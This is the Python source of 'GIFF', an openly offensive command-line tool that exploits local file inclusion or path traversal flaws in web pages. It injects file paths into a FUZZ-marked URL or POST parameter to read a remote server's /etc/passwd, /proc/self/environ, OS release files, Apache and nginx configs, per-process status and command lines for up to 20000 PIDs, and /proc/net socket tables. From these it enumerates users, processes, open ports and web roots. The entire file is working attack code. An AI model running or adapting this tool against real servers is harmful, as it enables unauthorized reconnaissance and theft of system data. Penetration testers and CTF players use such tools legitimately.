#!/usr/bin/env python
# This file is part of GIFF.
# Copyright (C) 2024 CODITRUST
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.

# DISCLAIMER:
# This software is provided "as-is", without any express or implied warranty.
# In no event will the authors be held liable for any damages arising from
# the use of this software.

import socket
import struct
import requests
import argparse
import sys
import struct
import ipaddress
from colorama import init, Fore, Back, Style
from urllib.parse import parse_qs

def hex2dec(s):
    return str(int(s, 16))

def ip2str(ip):
    if len(ip) <= 8:
        r = socket.inet_ntoa(struct.pack('I',socket.htonl(int(ip, 16))))
    else:
        int_address = int(ip, 16)
        ipv6_address = ipaddress.IPv6Address(int_address)
        return str(ipv6_address)

    s = r.split(".")
    s.reverse()
    return ".".join(s)

class InfosFromMachine():

    def __init__(self):
        self.users = {}
        self.ips = {}
        self.processes = {}
        self.encoders = []
        self.method = "get"
        self.url = ""
        self.template = "FUZZ"
        self.processes = []
        self.ips = []
        self.verbose = False
        self.startIndex = 0
        self.endIndex = 0
        self.n_start_junk = 0
        self.n_end_junk = 0
        self.proxy = ""
        
    def ask_for_file(self, method="get", url="", template="FUZZ", input=""):
        self.method = method
        self.url = url
        self.template = template
        self.proxies = {'http': self.proxy, 'https':self.proxy}
        
        if method.lower() == "get":
            if template != "":
                if str(input).find(template) == 0:
                    print(template)
                    print("[-] FUZZ is not present in your URL: Please, indicate where to inject!")
                    sys.exit()
                u = url.replace(template, str(input))
                r = requests.get(u, proxies=self.proxies)
                if len(r.content) > 3 and self.verbose:
                    print(f"-->  {u}")
                return r
            else:
                r = requests.get(url, proxies=self.proxies)
                return r
        elif method.lower() == "post":
            # Not supported for now
            if template != "":
                if str(input).find(template) == 0:
                    print(template)
                    print("[-] FUZZ is not present in your URL: Please, indicate where to inject!")
                    sys.exit()
                u = url
                
                params_dict = {k: v[0] for k, v in parse_qs(self.data.replace(template, str(input))).items()}
                r = requests.post(url, headers={"Content-Type":"application/x-www-form-urlencoded"}, data=params_dict, proxies=self.proxies)
                
                if len(r.content) > 3 and self.verbose:
                    print(f"-->  {u}")
                return r
            else:
                
                params_dict = {k: v[0] for k, v in parse_qs(self.data).items()}
                r = requests.post(url, headers={"Content-Type":"application/x-www-form-urlencoded"}, data=params_dict, proxies=self.proxies)
                return r
            
            return r

    def searchForIndexes(self, data_page, first_line=b"root:", last_line=""):
        
        if first_line != "" and last_line != "":
            start_index_page = data_page.find(first_line)
            if start_index_page != -1:
                self.n_start_junk = start_index_page
            else:
                self.n_start_junk = 0
                return -1

            last_index_page = data_page.rfind(last_line)
            if last_index_page != -1:
                self.n_end_junk = len(data_page) - last_index_page - len(last_line)
            else:
                self.n_end_junk = len(data_page)
                return -1
            
            n = 0
            data = data_page.splitlines()
            for line in data:
                i = line.find(first_line)
                
                if line.find(first_line) != -1:
                    self.startIndex = n
                    n += 1
                elif line.find(last_line) != -1:
                    n += 1
                    self.endIndex = n
                    break
                else:                    
                    n += 1 
            
            return 0
        elif first_line != "" and last_line == "":
            
            self.startIndex = data_page.find(first_line)
            self.n_start_junk = self.startIndex
            if self.n_start_junk == 0:
                pass
            
            if self.startIndex == -1:
                self.startIndex = 0
            n = 0
            for line in data_page[self.startIndex:].splitlines():
                if line.count(b":") != 6:
                    break
                else:
                    n += len(line) + 1 
            self.endIndex = self.startIndex + n
            #print(self.endIndex)
            #print(len(data_page))
            
            self.n_end_junk = len(data_page) - self.endIndex
            #self.n_end_junk = len(data_page)
            
            
            return 0
        elif first_line == "" and last_line == "":
            return 0
        
        
    def get_users(self):
        filename = "/etc/passwd"
        r = self.ask_for_file(self.method, self.url, self.template, filename)
        if r != None:
            
            self.searchForIndexes(r.content, first_line=b"root:")
            data = r.content[self.startIndex:self.endIndex]
            
            lines = data.splitlines()
            
            for l in lines:
                columns = l.split(b":")
                shell = columns[-1]
                if columns[1] != b"x":
                    print(Fore.RED + Style.BRIGHT + "The file /etc/passwd contains plain text passwords!" + Style.NORMAL + Fore.BLACK)
                self.users[columns[2]] = (l.strip()) # we get uid, names and shell


    def get_env(self):
        # TODO
        filename = "/proc/self/environ"
        r = self.ask_for_file(self.method, self.url, self.template, filename)
        if r != None:
            
            self.searchForIndexes(r.content)
            data = r.content[self.startIndex:self.endIndex]
            #data = r.content
            print(r.content)
            lines = data.split(b"\x00")
            
            
            for l in lines:
                print(l.strip())
                #columns = l.split(b":")
                #shell = columns[-1]
                #if columns[1] != b"x":
                #    print(Fore.RED + Style.BRIGHT + "The file /etc/passwd contains plain text passwords!" + Style.NORMAL + Fore.BLACK)
                #self.users[columns[2]] = (l.strip()) # we get uid, names and shell

    def get_os_version(self):
        # TODO
        filename = "/etc/os-release"
        r = self.ask_for_file(self.method, self.url, self.template, filename)
        if r != None:
            data = r.content[self.n_start_junk:-self.n_end_junk]
            lines = data.splitlines()
            
            for l in lines:

                key = l.strip().split(b"=")[0]
                value = l.strip().split(b"=")[1].replace(b'"', b'')
                if key == b"NAME":
                    print(f"OS Name: {value.decode()}")
                if key == b"VERSION":
                    print(f"OS Version: {value.decode()}")
                    
        filename = "/proc/sys/kernel/osrelease"
        r = self.ask_for_file(self.method, self.url, self.template, filename)
        if r != None:
            data = r.content[self.n_start_junk:-self.n_end_junk]
            
            print("Kernel version: " + data.strip().decode())
            
                

    def get_www_conf(self):
        filenames = ["/etc/apache2/sites-enabled/000-default.conf", "/etc/nginx/sites-enabled/default"]

        for filename in filenames:
            
            r = self.ask_for_file(self.method, self.url, self.template, filename)
            if r != None:

                if self.n_end_junk != 0:
                    data = r.content[self.n_start_junk:-self.n_end_junk]
                else:
                    data = r.content[self.n_start_junk:]
                
                lines = data.splitlines()
                
                for l in lines:

                    if b" " in l:
                        key = l.strip().split(b" ")[0]
                        value = l.strip().split(b" ")[1].replace(b'"', b'')
                        
                        if key.lower() == b"documentroot" and filename == "/etc/apache2/sites-enabled/000-default.conf":
                            print(f"Web Server Path (Apache2): {value.decode()}")
                            
                        if key.lower() == b"root" and filename == "/etc/nginx/sites-enabled/default":
                            print(f"Web Server Path (nginx): {value.decode().replace(';', '')}")

                    
        
            

            

    # Get user line (from /etc/passwd)
    # filter must be 'user', 'uid'
    def get_user_line(self, data, filter="uid"):
        for u in self.users.values():
            s = u.split(b":")
            
            if filter == "uid" and s[2].find(data) != -1:
                return s[0]
            if filter == "user" and s[0].find(data) != -1:
                return s[0]


                
    # first, we get /etc/passwd
    # then
    # BF of PID :
    # /proc/1713/status
    def read_executed_process_names(self):
        
        user = ""
        cmd = ""
        name = ""
        uid = None  # Initialiser uid au début
        ouput_csv_file = ""
        
        for pid in range(0, 20000):
            filename = "/proc/<PID>/status"
            
            if self.n_start_junk == 0 or self.n_end_junk == 0:
                pass
            
            filename_to_ask = filename.replace("<PID>", str(pid))
            r = self.ask_for_file(self.method, self.url, "FUZZ", filename_to_ask)
            
            if r is not None:# and r.content.find(b'Warning') == -1:

                res = self.searchForIndexes(r.content, first_line=b"Name:", last_line=b"nonvoluntary_ctxt_switches:")
                if res == -1:
                    continue
                
               
                if len(r.content) < 3:
                    continue
                
                data = r.content.splitlines()[self.startIndex:self.endIndex]

                lines = data

                for l in lines:

                    i_name = l.find(b"Name:")
                    if i_name != -1:
                        name = l[i_name+5:].strip()
                        continue
                    elif l.find(b"Uid:") != -1:
                        
                        uid = l.strip().split(b"\t")[1]
                        user = self.get_user_line(uid, "uid")
                        
                        decoded_user = user.decode('utf-8') if isinstance(user, bytes) else user
                        
                        continue
                    
                filename = "/proc/<PID>/cmdline"
                filename_to_ask = filename.replace("<PID>", str(pid))
                r = self.ask_for_file(self.method, self.url, "FUZZ", filename_to_ask)
                
                if r is not None:
                    if self.n_start_junk != 0 and self.n_end_junk != 0:
                        data = r.content[self.n_start_junk:-self.n_end_junk]
                    else:
                        data = r.content
                    
                    cmd = b" ".join(data.split(b"\x00")[:-1])
                    
                    decoded_cmd = cmd.decode('utf-8') if isinstance(cmd, bytes) else cmd
                    
                    # Check if uid is defined before to use it
                    if uid is not None:
                        
                        print(f"{filename_to_ask:<20} | {decoded_cmd} | {decoded_user}")
                        ouput_csv_file += f"\"{filename_to_ask}\";\"{decoded_cmd}\";\"{decoded_user}\"\n"
                        self.processes.append((name, uid, decoded_user, decoded_cmd))
                    
        filename_csv = "output_ps.csv"
        f = open(filename_csv, "w")
        f.write(ouput_csv_file)
        f.close()
        print(f"The output has been saved in {filename_csv}")
        


    def read_ipv4_address22(self, interface):
        try:
            with open(f"/sys/class/net/{interface}/address", 'r') as f:
                address = f.read().strip()
            return address
        except FileNotFoundError:
            pass
        return

    def get_MAC_address(self, interface): # TODO
        #interface = "eth0"  # Replace with the name of the interface you are interested in
        
        list_interfaces = ["eth0", "eth1", "eth2", "eth3"]
        for interface in list_interfaces:
            interface_ip = self.read_ipv4_address(interface)
            if interface_ip != None:
                print(f"Interface: {interface}, IP: {read_ipv4_address(interface)}")


        """
    def parse_ipv6_address(self, hex_str):
        address = ":".join(hex_str[i:i+4] for i in range(0, len(hex_str), 4))
        return address

    with open("/proc/net/if_inet6", 'r') as f:
        for line in f:
            fields = line.split()
            ipv6_address = parse_ipv6_address(fields[0])
            netmask = fields[2]
            device = fields[5]

            print(f"Device: {device}, IPv6: {ipv6_address}, Netmask: {netmask}")
        """



    def read_proc_net(self):
        
        list_ports = ["/proc/net/tcp", "/proc/net/udp", "/proc/net/tcp6", "/proc/net/udp6"]
        for filename_to_ask in list_ports:
            
            r = self.ask_for_file(self.method, self.url, "FUZZ", filename_to_ask)
            if r != None:
                if self.n_start_junk != 0 and self.n_end_junk != 0:
                    content = r.content[self.n_start_junk:-self.n_end_junk].splitlines()
                else:
                    content = r.content.splitlines()
                
                for line in content[1:]:
                    l = line.split(b':')
                    
                    if l[1].strip() == b"00000000000000000000000000000000":
                        l_host = "::" # IPv6 localhost
                    else:
                        l_host = ip2str(l[1].strip())
                    l_port = hex2dec(l[2].split(b" ")[0])
                    
                    if l[2].split(b" ")[1] == b"00000000000000000000000000000000":
                        r_host = "::" # IPv6 localhost
                    else:
                        r_host = ip2str(l[2].split(b" ")[1])
                    r_port = hex2dec(l[3].split(b" ")[1])
                    
                    if r_host == "0.0.0.0" or r_host == "::":
                        formatted_text = f"{('<<<---- LISTEN ON PORT ' + str(l_port)):>40}"
                        print(Fore.RED + Style.BRIGHT + f"Local IP: {l_host}:{l_port}, Remote IP: {r_host}:{r_port} " + formatted_text)
                    else:
                        print(Fore.BLACK + Style.NORMAL +f"Local IP: {l_host}:{l_port}, Remote IP: {r_host}:{r_port}")
                    
                    self.ips.append((f"{l_host}:{l_port}", f"{r_host}:{r_port}"))

                    
    def main(self):
        
        usage = """
        Get Infos From Files (GIFF)
        Author : Anthony Dessiatnikoff
        
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        $ python3 giff.py -u http://127.0.0.1/page.php?p=FUZZ --users
        [*] The following URL is targeted : http://127.0.0.1/page.php?p=
        [*] Users found:
        root (uid: 0)
        sss (uid: 1)
        ddd (uid: 102)
        fff (uid: 402)
        """
        
        parser = argparse.ArgumentParser(description=usage, formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument('-u', dest='url', nargs=1, help='the url to use ex: -u http://domain/page.php?p=FUZZ')

        parser.add_argument('-X', dest='method', nargs=1, help='the url to use ex: -X POST')
        parser.add_argument('-d', dest='data', nargs=1, help='the POST data to use ex: -d "file=FUZZ"')

        parser.add_argument('--users', action="store_true", help='To get users')
        parser.add_argument('--ps', action="store_true", help='To get executed processes')
        parser.add_argument('--ports', action="store_true", help='To get open ports')
        parser.add_argument('--path', action="store_true", help='To get the web server root path')
        #parser.add_argument('--env', action="store_true", help='To get info from current user')
        parser.add_argument('--os', action="store_true", help='To get info from OS')
        #parser.add_argument('--iface', action="store_true", help='To get network interfaces')
        
        parser.add_argument('-v', action="store_true", help='To display requests (verbose)')
        
        # TODO
        #parser.add_argument('--b64', help='To encode the FUZZ parameter in base64')
        #parser.add_argument('--delay', help='To add delay between requests')
        parser.add_argument('--proxy', nargs=1, help="To add a proxy, ex: --proxy 'http://127.0.0.1:8080'")
        
        args = parser.parse_args()

        if args.method:
            self.method = args.method[0]
        
        if args.data:
            self.data = args.data[0]

        if args.proxy:
            self.proxy = args.proxy[0]
        
        url = args.url
        self.verbose = args.v
        
        if url == None:
            print("Error: Need an URL to parse")
            sys.exit()

        self.url = url[0]

        print(f"[*] The following URL is targeted : {self.url}")


        if args.path:
            self.get_users()
            self.get_www_conf()

        #if args.env:
        #    self.get_users()
        #    self.get_env()
        
        if args.users:
            self.get_users()
            print("List of users in remote system:")
            
            for uid,name in self.users.items():
                shell = name.split(b':')[-1]
                if shell.find(b'sh') != -1:
                    print(Fore.RED + Style.BRIGHT + f"{name.split(b':')[0].decode()} (uid: {uid.decode()})   <------- user" + Style.NORMAL + Fore.BLACK)
                else:
                    print(f"{name.split(b':')[0].decode()} (uid: {uid.decode()})")
        
        if args.ps:
            self.get_users()
            self.read_executed_process_names()

        if args.ports:
            self.get_users()
            self.read_proc_net()


        if args.os:
            self.get_users()
            self.get_os_version()
            
        
def main():
    ifm = InfosFromMachine()
    ifm.main()
    
if __name__ ==  "__main__":
    main()
    
    sys.exit(0)
